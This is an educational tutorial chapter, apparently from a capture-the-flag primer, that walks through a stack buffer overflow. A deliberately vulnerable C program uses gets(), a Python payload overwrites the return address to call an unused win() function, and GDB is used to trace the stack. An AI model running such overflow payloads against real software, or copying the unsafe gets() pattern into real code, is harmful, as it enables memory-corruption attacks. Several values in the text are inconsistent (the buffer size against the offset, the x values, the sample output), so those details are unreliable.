@@ -1,0 +1,562 @@
+
+== Binary Exploitation
+
+Get ready for binary exploitation. We use C to explain binary exploitation because it is a language very prone to have vulnerabilities, however, other languages have similar vulnerabilities.
+
+=== A hack example!
+
+A hack is not necessarily a cyberattack. It is just a clever way to do something, in our context, on a computer. For example, how would you make a program to print the smallest of two numbers without using an if statement? This sounds complicated when you first hear it, but look at the following bit hack! Make a small program in C copying this code:
+
+
+[source, c]
+#include <stdio.h>
+int main(int argc, char **argv)
+{
+    int x=2;
+    int y=5;
+    int result=y^((x^y)&-(x<y));
+    printf("this is the smallest number %d \n", result);
+    return 0;
+}
+
+That was fantastic! What is happening here? Keep in mind the results of the following operations:
+
+[source, c]
+AND
+1 & 0 = 0
+0 & 0 = 0
+1 & 1 = 1
+0 & 1 = 0
+
+[source, c]
+XOR
+1 ^ 0 = 1
+0 ^ 0 = 0
+1 ^ 1 = 0
+0 ^ 1 = 1
+
+Now, we have y=5, x=9.Let’s analyze each part of:
+
+
+y ^ ( ( x ^ y ) & - ( x < y ) )
+
+In the part highlighted in bold:
+
+
+y ^ ( ( x ^ y ) & - *( x < y )* )
+
+x < y is false, in c false is represented as a 0, that in a byte would look like this: 00000000
+
+-0, es 0, so it keeps being 00000000
+
+So, -*( x < y )* is 0. So far we would have
+
+y ^ ( ( x ^ y ) & *0* )
+
+Now
+
+y ^ ( *(x^y)* & 0 )
+
+*( x ^ y )* & 0 is 0 , because any_value & 0, is still 0
+
+So we get to
+
+y ^ ( *0* )
+
+This is simply y ^ 0 , when you take any value and do XOR with zero, it is like doing nothing!
+
+So we get to *y* which is the smallest number (cool !!!!!!)
+
+That was amazing. That is a beautiful hack! It is actually called a bithack! In a computer, this operation executes much faster than an "if" statement. In most of the programs you don´t need to execute an operation that fast to comply with the functionality you need, but in some cases that is needed.
+
+Let's say that a hack could be simply a clever thing. Now, what is an exploit?
+
+It is an attack on a computer program. If a computer program has a vulnerability, a hacker can take advantage of such a vulnerability to make the program do something different from the original purpose of the program. Taking advantage of a vulnerability successfully, it is called an exploit.
+
+=== Stack overflow attack
+
+By this point you should already know how to use the terminal, compile programs and have some understanding of C programming. Create the following program in the shell server, and name it vuln1.c:
+
+[source, c]
+#include <stdio.h>
+#define BUFSIZE 4
+void win()
+{
+    puts("If I am printed, I was hacked! because the program never called me!");
+}
+void vuln()
+{
+    puts("Input a string and it will be printed back!");
+    char buf[BUFSIZE];
+    gets(buf);
+    puts(buf);
+    fflush(stdout);
+}
+int main(int argc, char **argv)
+{
+    vuln();
+    return 0;
+}
+
+You can see that the function win() is never called in the program. Therefore, the message that it prints should never be printed. right?
+
+Compile the program using:
+
+gcc vuln1.c -o vuln1 -fno-stack-protector -no-pie
+
+Now run the program using:
+
+&#46;/vuln1
+
+You can input a string, and it will print it back. For instance, if you input "HelloPicoCTF", it should show:
+
+Input a string and it will be printed back!
+
+[source, c]
+HelloPicoCTF
+HelloPicoCTF
+
+The program did what it was written for. Now, we are going to send a particular string to the program using python. You can run a single line of python in the command using the flag -c, and enclosing the line of code between single quotes. In the terminal you can pass the output of one command as the input to other command using the pipe, which is this character "|". In the following command we are printing something in python, and passing that to the C program we just compiled.
+
+[source, python]
+python -c 'print "hello world!" ' |./v1
+
+You should see "hello world!" printed back to the terminal right after the command. Note that in python you can  repeat the same character if you multiply it by a number, so 128*"@" is simply a string composed by 128 "@" repeated. For example if you run:
+
+[source, python]
+python -c 'print 10*"@"'
+
+You should see the output:
+
+[source, python]
+AAAAAAAAAA
+
+ Now we are going to send a string that is composed by 128 characters repeated, concatenated to some bytes.
+
+[source, python]
+python -c 'print 128*"@"+"\x20\xe0\xff\xff\xff\x7f\x00\x00\xb7\x05\x40\x00"' |./v1
+
+As result you will see:
+
+[source, text]
+If I am printed, I was hacked! because the program never called me!
+Segmentation fault (core dumped)
+
+What just happened? We simply sent a string, and a function that is never called in the program was called… We can send some particular input to the program to break it and make it do something that we want. That "particular input" you send to a program in the security jargon is called the "*payload*".
+
+You just hacked a very simple binary. But... what happened on the inside? Why?  A very rough explenation, is that when you call a function, the computer needs to know how to come back to continue executing the code that called it after the function finishes its execution. The address of the piece of code that you should continue on after the function call (you do not see this in the source code), is called the return address. Since the program is not checking the boundaries of the input in the C program we made, you can overwrite the place in which the return address is stored! Let’s understand that better so you can manipulate similar exploits at your will.
+
+=== What you need to know for a binary exploit
+
+The famous Stack Overflow is a type of Buffer Overflow, an anomaly that overwrites a memory sector where it should not. It causes security problems by opening doors for malicious actions to be executed. To understand it, it is necessary to have an idea of how the memory of a computer works.
+
+==== Memory 
+
+RAM means "random access memory". It is called Random Access because you can access any part of it directly, without having to pass first for other regions, as it was necessary at some point in history. For example, computers used to have a magnetic tape in which an item of data could only be accessed by starting from the beginning of the tape and finding an address sequentially. In a RAM we can go to any part of it immediately!
+
+Conceptually, a RAM is a grid with slots that can contain data. Let's imagine we have a RAM of only 5 slots. We could name each slot by a number, starting at 0, so it would look like this:
+
+
+[.text-center]
+image:images/4image36.png[image,width=198,height=222]
+
+
+Now, if we want to put the word "HELLO" in our imaginary memory, we could put each character of "HELLO" in each slot, like this:
+
+[.text-center]
+image:images/4image37.png[image,width=198,height=222]
+
+The numbers we used to identify each slot of the memory are called addresses. If we ask: what character is in the address 1? The answer would be the character ‘E’. A real memory from a computer nowadays can have billions of addresses. Normally, addresses are shown in hexadecimal. For example, the address "255" would normally be shown as "0xFF".
+
+In a program, the memory is used in a certain way to be able to do all that the program can do, and the program itself is present in memory when it is being executed. The memory is organized in the following sections:
+
+When we compile a C source code, this is converted to machine code also known as binary. When a program is run, this machine code is placed in the code section. The code section holds only machine code, not the source code we know from C for example. The machine code is a set of instructions that the processor of a computer can understand. The computer will execute the instructions sequentially and while doing that will access other parts of memory to read data and output results.
+
+A program has several sections, but for now, let's keep in mind the following three sections:
+
+* Data section
+* Heap
+* Stack
+
+In the data section, static and global variables are placed. This variables always exist when the program is being run, in contrast to local variables that disappear when a function finishes and returns the result.
+
+In the heap is placed the memory allocated dynamically. For example, when you use malloc in C to allocate a buffer, that buffer is allocated on the heap. It is called dynamic allocation because the program allocates memory when is already running and executing the particular instruction for malloc. In the code you write you can also decide to deallocate a buffer of memory that you previously allocated. So, it is called dynamic because the programmer can allocate it and deallocate a chunk of memory of a desired size.
+
+In the Stack segment, are placed the local variables, function parameters and return addresses. What is a return address? When we call a function, the address of the next instruction has to be stored somewhere so the program knows where to comeback after the function is finished. We call this address the "return address". A function can be called in different parts of a program, so this return address will be different depending on where the program calls the function.
+
+=== Example of Execution of a program 
+
+The execution of a program and its memory is controlled by processor registers, usually called simply registers. These are a very small and fast kind of memory that is attached to the processor. A register can store 4 or 8 bytes, depending on the processor. A processor only has a few registers. Depending on the kind of processor, the registers might differ. But we will take a look at the ones that are generic to most processors and will let us understand later the most common binary exploits.
+
+To see a real example in action we can use GDB, a software that allows us to see the execution of each part of a programs and its memory step by step. This kind of software is called a debugger. When a binary program is running and we debug it, we can see in detail what the program is doing in memory by analyzing the *Assembly*. What is the Assembly? It is a low level language that can be used to show what each instruction from the machine code does. GDB can generate assembly from the machine code in memory while we are debugging the program so we can easily see what the machine code is doing.
+
+==== GDB, Assembly and machine code
+
+In the shell server, GDB is already installed, so you can run
+
+[source, text]
+gdb ./vuln1
+
+You should see something like this:
+
+[source, text]
+GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law. Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from vuln1...(no debugging symbols found)...done.
+(gdb)
+
+Now, input "run" and press enter. Remember to press enter after using a command. The program "vuln1" will be executed, so you can enter any string and it will print it back, as it normally does the program "vuln1". You should see something like this if the string you input is "HelloPicoCTF":
+
+[source, text]
+(gdb) run
+Starting program: /vuln1
+Input a string and it will be printed back!
+HelloPicoCTF
+HelloPicoCTF
+[Inferior 1 (process 95000) exited normally]
+(gdb)
+
+If you input "r" instead of "run", it will do the same because "r" is the GDB abbreviation for "run". If you do the experiment you should see  the same:
+
+[source, text]
+(gdb) r
+Starting program: /vuln1
+Input a string and it will be printed back!
+HelloPicoCTF
+HelloPicoCTF
+[Inferior 1 (process 95000) exited normally]
+(gdb)
+
+To exit from GDB, you can input "quit" and press enter. Also, you could input only "q" and it will quit too. In several GDB commands, you can also input the first character of the command, and GDB will understand.
+
+Now, open GDB again to debug "vuln1" with the same command we used previously:
+
+[source, text]
+gdb ./vuln1
+
+But now, before running it using "run", we want to stop at the beginning of the function "vuln()". To do this, you can set a breakpoint at vuln(). Setting a breakpoint, simply means that the execution of the program will pause in the instruction you set the breakpoint. By running "break vuln" or "b vuln", a breakpoint will be set at the beginning of vuln. We will see this:
+
+[source, text]
+(gdb) b vuln
+Breakpoint 1 at 0x4005ce
+
+IMPORTANT: the addresses you see might be different, that is ok.
+
+What does it mean "Breakpoint 1 at 0x4005ce" ? Do you remember that there is a segment of the memory in which the machine code is placed? In the memory address "0x4005ce" the machine code of "vuln()" begins. Input "r" to start the execution of the program and you will see:
+
+[source, text]
+(gdb) r
+Starting program: /home/samuel/Desktop/problems/vuln1
+Breakpoint 1, 0x00000000004005ce in vuln ()
+(gdb)
+
+"Breakpoint 1, 0x00000000004005ce in vuln ()" means that the first break point we have set, was established at address "0x00000000004005c", which is the same address as "0x4005c"; An address is a number in this case, so zeros at the left cause no effect. Note that in other cases, zeros at the left can have an effect if what we are reading is not being interpreted as a number.
+
+===== Processor registers
+
+A program is made up of several instructions that are executed sequentially. The processor of the computer has an integrated and very small memory different from RAM, called the "registers". A processor only has a few registers. Each register can hold only 8 bytes in a 64 bit processor, and 4 bytes in a 32 bit processor. A 32 bit program can run on a 64 bit processor, but 64 bit program cannot run on a 32 bit processor. One of the registers is called the Instruction Pointer, abbreviated as IP, that keeps track of the part of the program that is currently being executed. In a 64 bit program, we can print the value of this register in GDB using "x $rip":
+
+[source, text]
+(gdb) x $rip
+0x4005ce <vuln+4>: 0x80c48348
+(gdb)
+
+Note that the first part of the line shown is "0x4005ce", this is exactly where the breakpoint was placed, so the IP naturally has that value because we made the program pause there. Then we have "<vuln+4>", do you remember we said that by setting a breakpoint at a function it would pause at the beginning of the function? To be more precise, a breakpoint on a function is usually placed 4 bytes after the beginning of the machine code of what is considered the function. That’s why the "+4". Later we will understand why it’s done like this. The remaining part, "0x80c48348", is the actual content at the address "0x4005ce". That content is a part of the machine code of the "vuln()" function.
+
+To show the whole machine code of the function, showing each instruction on each address and its machine code, we can run "disas /r":
+
+ 
+[source, assembly]
+(gdb) disas /r
+Dump of assembler code for function vuln:
+0x4005ca <+0>: 55    push %rbp
+0x4005cb <+1>: 48 89 e5    mov %rsp,%rbp
+=> 0x4005ce <+4>: 48 83 c4 80    add $0xffffffffffffff80,%rsp
+0x4005d2 <+8>: 48 8d 3d 27 01 00 00    lea 0x127(%rip),%rdi
+0x4005d9 <+15>: e8 c2 fe ff ff    callq 0x4004a0 <puts@plt>
+0x4005de <+20>: 48 8d 45 80    lea -0x80(%rbp),%rax
+0x4005e2 <+24>: 48 89 c7 mov    %rax,%rdi
+0x4005e5 <+27>: b8 00 00 00 00    mov $0x0,%eax
+0x4005ea <+32>: e8 c1 fe ff ff    callq 0x4004b0 <gets@plt>
+0x4005ef <+37>: 48 8d 45 80    lea -0x80(%rbp),%rax
+0x4005f3 <+41>: 48 89 c7    mov %rax,%rdi
+0x4005f6 <+44>: e8 a5 fe ff ff    callq 0x4004a0 <puts@plt>
+0x4005fb <+49>: 48 8b 05 3e 0a 20 00    mov 0x200a3e(%rip),%rax
+0x400602 <+56>: 48 89 c7    mov %rax,%rdi
+0x400605 <+59>: e8 b6 fe ff ff    callq 0x4004c0 <fflush@plt>
+0x40060a <+64>: 90    nop
+0x40060b <+65>: c9    leaveq
+0x40060c <+66>: c3    retq
+End of assembler dump.
+(gdb)
+
+Each line of what was just printed by GDB is organized in three parts. Let’s analyze the following line to introduced machine code and assembly:
+
+0x400602 <+56>: 48 89 c7 mov %rax,%rdi
+
+The left part is the address "0x400602 <+56>". After the address some spaces are shown, then in the middle we find the machine code, that in this case is "48 89 c7". After some other spaces, we find the Assembly, which is "mov %rax,%rdi". Assembly is a low level language that can be directly mapped to the machine code. That’s why GDB can see some machine code in the memory and print for us the assembly that represents. A specific sequence of bytes in the machine code maps to an instruction of assembly. So, when a program is running and in memory is seen the sequence of bytes "48 89 c7" in the code segment, the computer knows that is some specific instruction and the processor has to do a specific action. Right now the intention is not to explain assembly in detail, but just for the sake of this example, know that "mov %rax,%rdi" moves the value of the register "rax" into the register "rdi". While the program is being executed by going forward in the code section of memory where the machine code is located, and it appears the sequence of bytes "48 89 c7", the processor knows that it has to copy the register "rax" into "rdi". Note that in the function, there are two parts in which appears the machine code "48 89 c7" and both have the same assembly.
+
+Now, in this line:
+
+*=>* 0x4005ce <+4>: 48 83 c4 80 add $0xffffffffffffff80,%rsp
+
+do you see the arrow "=>" at the left? That indicates the instruction in which we are. Next to it there is an address, that as expected, has the same value as the Instruction Pointer. Then there is the <+4> which we already explained, followed by the machine code "48 83 c4 80" at the address 0x4005ce… Hold on, what is going on? A few paragraphs ago we said that the machine code at that address was " 0x 80 c4 83 48" when we printed the Instruction Pointer using "x $rip". But now we say it is "48 83 c4 80". If you look closely, these are the same bytes but backwards. Let’s take advantage of this opportunity to explain "little endian".
+
+===== 19.2.1.3 Little endian
+
+In most of the computers we use in everyday life, the numbers are interpreted as little endian. So when you read this from memory:
+
+*48 83 c4 80*
+
+It will be interpreted and shown as this:
+
+*80 c4 83 48*
+
+This is the case only for numbers. Addresses are numbers. In an attack when you want to overwrite an address, you have to consider this and input the bytes of the address backwards so they are interpreted in the correct manner. Why computers do this? There are some reasons and consequences. In fact there are also reasons for using "big endian" which is using the bytes without inverting them. One argument commonly given for supporting little endian, is that some operations are easier to do. For instance, if you have a number, let’s say 255 in decimal, in hexadecimal it would be is 0xff in hexadecimal. If the number is contained in a variable type that takes 4 bytes, for example an "int" in C, it would look like this in memory:
+
+ff 00 00 00
+
+Then, you want to cast it to a type that only takes two bytes, for example a "short" in C. In memory, you can leave the same value without having to move anything, and the "short" would look like this:
+
+ff 00
+
+Now, imagine that we were not using little endian. The type "int" would hold the number like this
+
+00 00 00 ff
+
+And the "short" like this:
+
+00 ff
+
+Note that we had to move the ff, which originally was on the fourth byte, and now it is in the second byte.
+
+In summary, what you should remember for binary exploits, is that if you want to write a number into memory, you have to write its bytes backwards. Also, remember that this is only for numbers. In a hypothetical situation if you want to place in memory the string "HELLO", you can put it in its original order.
+
+In GDB is possible to show a chunk of memory at a specific location using a command such as "x/16xw 0x4005da". This will print 16 words after the address 0x4005da. A word in a 64 bit processor, has 8 bytes, so that command is going to print 64 bytes. Run the command yourself! You should see something like this:
+
+[source, assembly]
+(gdb) x/16xw 0x4005ce
+0x4005ce <vuln+4>: 0x80c48348 0x273d8d48 0xe8000001 0xfffffec2
+0x4005de <vuln+20>: 0x80458d48 0xb8c78948 0x00000000 0xfffec1e8
+0x4005ee <vuln+36>: 0x458d48ff 0xc7894880 0xfffea5e8 0x058b48ff
+0x4005fe <vuln+52>: 0x00200a3e 0xe8c78948 0xfffffeb6 0x55c3c990
+(gdb)
+
+Note that GDB prints each group of 4 bytes as a numbers. Because of little endianess, each of those groups of 4 bytes, is reversed in memory. When using the previous command, no matter what is inside the memory, everything will be printed in reverse for each group of 4 bytes.
+
+//BEGIN EDITING HERE!
+===== Function call
+
+When a function is called, the IP moves to wherever the code of the function is located. When the function is finished, the IP moves back to the next instruction to the function call. As we mentioned previously, the address of the next instruction has to be stored somewhere so the program knows where to comeback after the function is finished. We call this address the "return address". The return address is stored in the memory segment that we called the stack. How do we know in which part of the stack? There is a register called the Stack Pointer (SP), that points to the tip of the stack. When a function is called, the stack pointer moves to make room for the return address and new local variables. When the function is finished, the stack pointer moves to the original position prior to the function call, making the memory addresses in which the local variables were free again.
+
+(stack explanation graphically, and show how the stack pointer points to it)
+
+Let’s see this in practice.
+
+In GDB, set a breakpoint in the function "main" using "b main":
+
+(gdb) b main
+
+And run the program again using "r"
+
+(gdb) r
+
+The program being debugged has been started already.
+
+Start it from the beginning? (y or n) y
+
+Starting program: /vuln1
+
+Breakpoint 2, 0x0000000000400611 in main ()
+
+(gdb)
+
+To show the assembly of the current function in where we are, which is "main", use "disas":
+
+(gdb) disas
+
+Dump of assembler code for function main:
+
+0x000000000040060d <+0>: push %rbp
+
+0x000000000040060e <+1>: mov %rsp,%rbp
+
+=> 0x0000000000400611 <+4>: sub $0x10,%rsp
+
+0x0000000000400615 <+8>: mov %edi,-0x4(%rbp)
+
+0x0000000000400618 <+11>: mov %rsi,-0x10(%rbp)
+
+0x000000000040061c <+15>: mov $0x0,%eax
+
+0x0000000000400621 <+20>: callq 0x4005ca <vuln>
+
+0x0000000000400626 <+25>: mov $0x0,%eax
+
+0x000000000040062b <+30>: leaveq
+
+0x000000000040062c <+31>: retq
+
+End of assembler dump.
+
+Even if you don’t know assembly, if you look through it, you might guess that "callq 0x4005ca <vuln>" is the function call to "vuln". We will go to that instruction in the debugger. To advance one instruction in GDB we can use "si". Try it, and use "disas" again to see where we are now. You should see something like this:
+
+(gdb) si
+
+0x0000000000400615 in main ()
+
+(gdb) disas
+
+Dump of assembler code for function main:
+
+0x000000000040060d <+0>: push %rbp
+
+0x000000000040060e <+1>: mov %rsp,%rbp
+
+0x0000000000400611 <+4>: sub $0x10,%rsp
+
+=> 0x0000000000400615 <+8>: mov %edi,-0x4(%rbp)
+
+0x0000000000400618 <+11>: mov %rsi,-0x10(%rbp)
+
+0x000000000040061c <+15>: mov $0x0,%eax
+
+0x0000000000400621 <+20>: callq 0x4005ca <vuln>
+
+0x0000000000400626 <+25>: mov $0x0,%eax
+
+0x000000000040062b <+30>: leaveq
+
+0x000000000040062c <+31>: retq
+
+End of assembler
+
+We could use "si" three times more to get to the instruction in which the function call is made. But this strategy might be not good if we are far away from the function call. Instead, We can set a breakpoint in the memory address of the function call, that we see is "0x0000000000400621". To set a breakpoint on a memory address, we also use "b", but we put an asterisk previous to the address like this "b *0x0000000000400621", after pressing enter you should see something like:
+
+(gdb) b *0x0000000000400621
+
+Breakpoint 3 at 0x400621
+
+(gdb)
+
+Now, use "continue" or "c" to continue to the breakpoint:
+
+(gdb) c
+
+Continuing.
+
+Breakpoint 3, 0x0000000000400621 in main ()
+
+(gdb)
+
+Now, verify that we actually get to where we wanted using "disas":
+
+(gdb) disas
+
+Dump of assembler code for function main:
+
+0x000000000040060d <+0>: push %rbp
+
+0x000000000040060e <+1>: mov %rsp,%rbp
+
+0x0000000000400611 <+4>: sub $0x10,%rsp
+
+0x0000000000400615 <+8>: mov %edi,-0x4(%rbp)
+
+0x0000000000400618 <+11>: mov %rsi,-0x10(%rbp)
+
+0x000000000040061c <+15>: mov $0x0,%eax
+
+=> 0x0000000000400621 <+20>: callq 0x4005ca <vuln>
+
+0x0000000000400626 <+25>: mov $0x0,%eax
+
+0x000000000040062b <+30>: leaveq
+
+0x000000000040062c <+31>: retq
+
+End of assembler dump.
+
+(gdb)
+
+At this point, the program is about to execute the function call to "vuln()". Remember that the return address is the next instruction to the function call. Note that If it was the same as the function call, it would return and call the function again and get into an infinite loop
+
+In this case, the return address is "0x0000000000400626", remember this address. If we check the Stack Pointer (SP) right now using "x $rsp" we would see that it points to an address that does not contain the return address yet:
+
+(gdb) x $rsp
+
+0x7fffffffe010: 0xffffe108
+
+If we advance one instruction using "si", we would suddenly be in the first instruction of the function "vuln()":
+
+(gdb) si
+
+0x00000000004005ca in vuln ()
+
+(gdb) disas
+
+Dump of assembler code for function vuln:
+
+=> 0x00000000004005ca <+0>: push %rbp
+
+0x00000000004005cb <+1>: mov %rsp,%rbp
+
+0x00000000004005ce <+4>: add $0xffffffffffffff80,%rsp
+
+0x00000000004005d2 <+8>: lea 0x127(%rip),%rdi # 0x400700
+
+0x00000000004005d9 <+15>: callq 0x4004a0 <puts@plt>
+
+0x00000000004005de <+20>: lea -0x80(%rbp),%rax
+
+0x00000000004005e2 <+24>: mov %rax,%rdi
+
+0x00000000004005e5 <+27>: mov $0x0,%eax
+
+0x00000000004005ea <+32>: callq 0x4004b0 <gets@plt>
+
+0x00000000004005ef <+37>: lea -0x80(%rbp),%rax
+
+0x00000000004005f3 <+41>: mov %rax,%rdi
+
+0x00000000004005f6 <+44>: callq 0x4004a0 <puts@plt>
+
+0x00000000004005fb <+49>: mov 0x200a3e(%rip),%rax
+
+0x0000000000400602 <+56>: mov %rax,%rdi
+
+0x0000000000400605 <+59>: callq 0x4004c0 <fflush@plt>
+
+0x000000000040060a <+64>: nop
+
+0x000000000040060b <+65>: leaveq
+
+0x000000000040060c <+66>: retq
+
+End of
+
+And if we check the SP again:
+
+(gdb) x $rsp
+
+0x7fffffffe008: 0x00400626
+
+(gdb)
+
+Do you remember the return address was "0x0000000000400626"? We can see that the SP points to the address "0x7fffffffe008", and that address contains the return address!
+
+The whole idea of the attack, is to modify the return address, to return at another place. In our attack example at the beginning, we modify it so it returned to the function "win()".
+
+The function gets() in C, simply copies any user input and puts all that in memory, so we simply need to overwrite the return address.
